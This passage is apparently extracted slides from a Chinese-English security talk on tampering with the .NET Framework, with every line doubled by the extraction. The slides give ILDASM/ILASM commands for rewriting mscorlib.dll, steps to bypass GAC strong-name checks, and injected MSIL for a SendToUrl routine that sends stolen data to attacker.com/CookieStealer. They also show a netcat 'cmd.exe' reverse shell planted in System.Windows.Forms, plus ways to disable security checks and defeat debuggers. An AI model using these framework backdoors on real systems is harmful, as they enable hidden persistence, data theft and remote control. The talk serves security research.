77
77
C:
C:\\winnt
winnt\\assembly
assembly
78
78
使用
使用reflector
reflector找出
找出writeline
writeline()()
79
79
反组译
反组译mscorlib.dll
mscorlib.dll
 ILDASM /OUT=
ILDASM /OUT=mscorlib.dll.il
mscorlib.dll.il /NOBAR /LINENUM /SOURCE 
/NOBAR /LINENUM /SOURCE 
mscorlib.dll
mscorlib.dll
80
80
从
从mscorlib.dll.il
mscorlib.dll.il 找到
找到writeline(string
writeline(string))
81
81
把他变成兩次
把他变成兩次output
output
(IL address
(IL address记得修正
记得修正))
82
82
WriteLine
WriteLine in MSIL (original VS. 
in MSIL (original VS. 
modified code)
modified code)
 Original code of 
Original code of WriteLine
WriteLine::
 Modified code:
Modified code:
Print #1 
(same as 
before)
Print #2 
(duplicate)
83
83
重新
重新compiler
compiler
 ILASM /DEBUG /DLL /QUIET 
ILASM /DEBUG /DLL /QUIET 
/OUTPUT=
/OUTPUT=mscorlib.dll
mscorlib.dll mscorlib.dll.il
mscorlib.dll.il
84
84
有了
有了 真的
真的writeline
writeline()()被换了耶
被换了耶
85
85
雪特
雪特…
…没有成功
没有成功....可是
可是dll
dll都换掉了耶
都换掉了耶
86
86
原來是
原來是cache
cache作怪
作怪
 ngen
ngen uninstall 
uninstall mscorlib.dll
mscorlib.dll
 Replace new 
Replace new mscorlib.dll
mscorlib.dll
 Ngen
Ngen install 
install mscorlib.dll
mscorlib.dll
87
87
Work
Work
88
88
修改
修改 Framework 
Framework 核心步骤
核心步骤
 Locate the DLL in the GAC, and copy it 
Locate the DLL in the GAC, and copy it 
outside
outside
 Analyze the DLL
Analyze the DLL
 Decompile the DLL using 
Decompile the DLL using ildasm
ildasm
 Modify the MSIL code 
Modify the MSIL code Recompile to a new 
Recompile to a new 
DLL using 
DLL using ilasm
ilasm
 Bypass the GAC strong name protection
Bypass the GAC strong name protection
 Reverting back from NGEN Native DLL
Reverting back from NGEN Native DLL
 Deploy the new DLL while overwriting the 
Deploy the new DLL while overwriting the 
original
original
89
89
躲过
躲过 GAC 
GAC 强名
强名(Strong Name)
(Strong Name)检验
检验
 DLL
DLL修改过后
修改过后, , 会躲不过
会躲不过GAC
GAC强名检验
强名检验
 因为每个
因为每个DLL
DLL都有独一无二的签名
都有独一无二的签名
 躲过方法
躲过方法
•• 偷到
偷到microsoft
microsoft的私钥
的私钥((private key)
private key)
•• 把签名去掉
把签名去掉((StrongNameRemove
StrongNameRemove工具
工具))
•• 自己签一个
自己签一个(Re
(Re--sign
sign工具
工具))
•• 把
把DLL
DLL放在正确的目錄下
放在正确的目錄下
 c:
c:\\winnt
winnt\\assembly
assembly\\GAC_32
GAC_32\\mscorlib
mscorlib\\2.0.0.0
2.0.0.0
_b77a5c561934e089
_b77a5c561934e089
90
90
安装
安装 backdoors 
backdoors 与
与rootkits
rootkits
 So now we know we can modify the framework 
So now we know we can modify the framework 
and make it behave the way we want
and make it behave the way we want
 It is possible to plant malicious code inside the 
It is possible to plant malicious code inside the 
framework itself
framework itself
•• We can backdoor some sensitive internal 
We can backdoor some sensitive internal 
methods
methods
•• It is also possible to deploy 
It is also possible to deploy rootkits
rootkits deep into 
deep into 
the framework 
the framework 
 The malicious code will be hidden and undetected 
The malicious code will be hidden and undetected 
inside the Framework
inside the Framework
 Code review will never detect them because 
Code review will never detect them because 
they
they’’re not at the application level code
re not at the application level code
91
91
SendToUrl
SendToUrl implementation
implementation
 Code:
Code:
.method public 
.method public hidebysig
hidebysig static void  
static void  SendToUrl(string
SendToUrl(string url
url,,
string data) 
string data) cil
cil managed
managed
{{
..maxstack
maxstack 88
IL_0000:  
IL_0000:  nop
nop
IL_0001:  ldarg.0
IL_0001:  ldarg.0
IL_0002:  ldarg.1
IL_0002:  ldarg.1
IL_0003:  call       string 
IL_0003:  call       string System.String::Concat(string,string
System.String::Concat(string,string)    
)    
IL_0008:  call       class [
IL_0008:  call       class [System]System.Net.WebRequest
System]System.Net.WebRequest
[[System]System.Net.WebRequest::Create(string
System]System.Net.WebRequest::Create(string))
IL_000d:  
IL_000d:  callvirt
callvirt
instance class 
instance class 
[[System]System.Net.WebResponse
System]System.Net.WebResponse
[[System]System.Net.WebRequest::GetResponse
System]System.Net.WebRequest::GetResponse()
()
IL_0012:  pop
IL_0012:  pop
IL_0013:  ret
IL_0013:  ret
} // end of method Class1::SendToUrl
} // end of method Class1::SendToUrl
92
92
SendToUrl
SendToUrl usage
usage
 The following injected MSIL code will do the job
The following injected MSIL code will do the job
..locals init 
locals init ((string V_0
string V_0))
IL_0000
IL_0000:  
:  ldstr
ldstr
""SomeSensitiveStolenData
SomeSensitiveStolenData""
IL_0005
IL_0005:  
:  stloc
stloc..00
IL_0006
IL_0006:  
:  ldstr
ldstr
""http
http://
://www
www..attacker
attacker..com
com//CookieStealer
CookieStealer//WebFor
WebFor
m1
m1..asp
asp""
+ "
+ "xx\\?s
?s="
="
IL_000b
IL_000b:  
:  ldloc
ldloc..00
IL_000c
IL_000c:  
:  call       void 
call       void 
System
System..Object
Object::
::SendToUrl
SendToUrl((string,string
string,string)                   
)                   
93
93
ReverseShell
ReverseShell implementation
implementation
 netcat
netcat IP
IP PORT 
PORT --e 
e cmd.exe
cmd.exe
 Code 
Code 
..method public 
method public hidebysig
hidebysig static void  
static void  ReverseShell
ReverseShell((string
string ip
ip,,
int32 port
int32 port) 
) cil
cil managed
managed
{{
// 
// Code size       259
Code size       259 ((0x103
0x103))
..maxstack
maxstack 33
..locals init 
locals init ([
([00] 
] string 
string cmdfilename
cmdfilename,, [[11] 
] string filename,
string filename, [[22] 
] uint8
uint8[] 
[] netcat
netcat,,
[[33] 
] class System
class System..IO
IO..BinaryWriter
BinaryWriter binWriter1,
binWriter1,[[44] 
] uint8
uint8[] 
[] cmd
cmd,,
[[55] 
] class System
class System..IO
IO..BinaryWriter
BinaryWriter binWriter2,
binWriter2,[[66] 
] string arguments,
string arguments,
[[77] 
] class 
class [[System
System]]System
System..Diagnostics
Diagnostics..Process proc,
Process proc,
[[88] 
] object
object[] 
[] CS$0$0000
CS$0$0000))
IL_0000
IL_0000:  
:  nop
nop
IL_0001
IL_0001:  
:  ldstr
ldstr
""cmd
cmd..exe
exe""
IL_0006
IL_0006:  
:  stloc
stloc..00
IL_0007
IL_0007:  
:  ldstr
ldstr
""netcat
netcat..exe
exe""
IL_000c
IL_000c:  
:  stloc
stloc..11
…
…
…
…
IL_0101
IL_0101:  
:  pop
pop
IL_0102
IL_0102:  
:  ret
ret
} 
} // 
// end of method 
end of method ::
::ReverseShell
ReverseShell
94
94
ReverseShell
ReverseShell usage
usage
 The following injected MSIL code will do 
The following injected MSIL code will do 
the job
the job
IL_0000:  
IL_0000:  ldstr
ldstr
"192.168.50.129
"192.168.50.129““ // attacker 
// attacker 
ip
ip address
address
IL_0005:  ldc.i4     
IL_0005:  ldc.i4     0x4d2
0x4d2
// port 1234 
// port 1234 
IL_0006:  call       void     
IL_0006:  call       void     
System.Object::ReverseShell(string,int32)
System.Object::ReverseShell(string,int32)
95
95
安装反弹端口木马
安装反弹端口木马
 In our next example we
In our next example we’’ll inject the 
ll inject the 
ReverseShell
ReverseShell function and execute it
function and execute it
 Let
Let’’s make a reverse shell every time 
s make a reverse shell every time 
a 
a winform
winform executable is run
executable is run
•• Just for demonstration 
Just for demonstration pusposes
pusposes....
 So we
So we’’ll inject code that execute our 
ll inject code that execute our 
reverse shell into 
reverse shell into 
System.Windows.Forms.dll
System.Windows.Forms.dll, at 
, at 
function 
function Run(Form
Run(Form mainForm
mainForm))
96
96
安装反弹端口木马
安装反弹端口木马
Injected
Original code
Modified code (pre injection)
97
97
Disabling security checks 
Disabling security checks 
 Messing around with CAS (Code Access Security) 
Messing around with CAS (Code Access Security) 
can be achieved by modifying the behavior of 
can be achieved by modifying the behavior of 
important classes from 
important classes from System.Security
System.Security, , 
System.Security.Permissions
System.Security.Permissions, etc..
, etc..
•• Again, from 
Again, from mscorlib.dll
mscorlib.dll....
 It is possible to disable security checks by 
It is possible to disable security checks by 
changing the logic of
changing the logic of
•• CodeAccessPermission::Demand
CodeAccessPermission::Demand()
()
•• CodeAccessPermission::Deny
CodeAccessPermission::Deny()
()
•• CodeAccessPermission::Assert
CodeAccessPermission::Assert()
()
•• FileIOPermission
FileIOPermission, , RegistryPermission
RegistryPermission, etc.
, etc.
98
98
Anti Tech
Anti Tech
99
99
Anti Tech
Anti Tech
 Obfucation
Obfucation
 Packer & Anti
Packer & Anti--Debug
Debug
 Virtual Machine idea
Virtual Machine idea
100
100
Obfuscation
Obfuscation
 Name Obfuscation
Name Obfuscation
 Control
Control--Flow Obfuscation
Flow Obfuscation
 String Encoding
String Encoding
101
101
Control
Control--Flow Obfuscation
Flow Obfuscation
 Stack/heap crash
Stack/heap crash
•• br
br IL_0000
IL_0000
•• pop
pop
•• ldc.i4.1
ldc.i4.1
•• IL_0000: 
IL_0000: nop
nop
 Anti
Anti--DeCompiler
DeCompiler
•• C#
C#没有
没有 filter/fault
filter/fault
•• try
try--catch block
catch block交错
交错 ((可
可decompiler
decompiler, , 但不
但不
能
能re
re--compiler)
compiler)
102
102
Packer & Anti
Packer & Anti--Debug
Debug
 Anti
Anti--Profiler
Profiler
•• Process initial environment modify
Process initial environment modify
 COR_ENABLE_PROFILING 1
COR_ENABLE_PROFILING 1
00
103
103
Packer & Anti
Packer & Anti--Debug
Debug
 Anti
Anti--Profiler
Profiler
•• .net core patch
.net core patch
 Sxe
Sxe ld:Profiler
ld:Profiler
 Bp 
Bp 
profiler!CprofilerCallback::JITCompilationSta
profiler!CprofilerCallback::JITCompilationSta
rted
rted
 Mscordbc!EEToProfInterfaceImp1::CreatingP
Mscordbc!EEToProfInterfaceImp1::CreatingP
rofiler+0x??
rofiler+0x??
 讀取
讀取 COR_ENABLE_PROFILING
COR_ENABLE_PROFILING的地方
的地方, , 也是我
也是我
们要
们要patch
patch的地方
的地方
104
104
Packer & Anti
Packer & Anti--Debug
Debug
 Anti
Anti--Debug
Debug
•• DebuggerHiddenAttribute
DebuggerHiddenAttribute
•• DebuggerNonUserCodeAttribute
DebuggerNonUserCodeAttribute
•• DbuggerStepThroughAttribute
DbuggerStepThroughAttribute
 Anti
Anti--ildasm
ildasm
•• SuppressIldasmAttribute
SuppressIldasmAttribute
 Anti
Anti--Compiler
Compiler
•• 空名称的
空名称的Resources
Resources
105
105
Packer & Anti
Packer & Anti--Debug
Debug
 Packer
Packer
•• AdeptCompressor
AdeptCompressor
•• .NETZ
.NETZ
•• .NET Reactor
.NET Reactor
•• CodeVeil
CodeVeil
 Pro
Pro--Method Packer 
Method Packer 
•• 使用
使用JIT
JIT概念
概念
•• 保护对象是单个方法
保护对象是单个方法
•• 使用到才解开
使用到才解开
106
106
Q & A
Q & A
107
107
.net 4.0
.net 4.0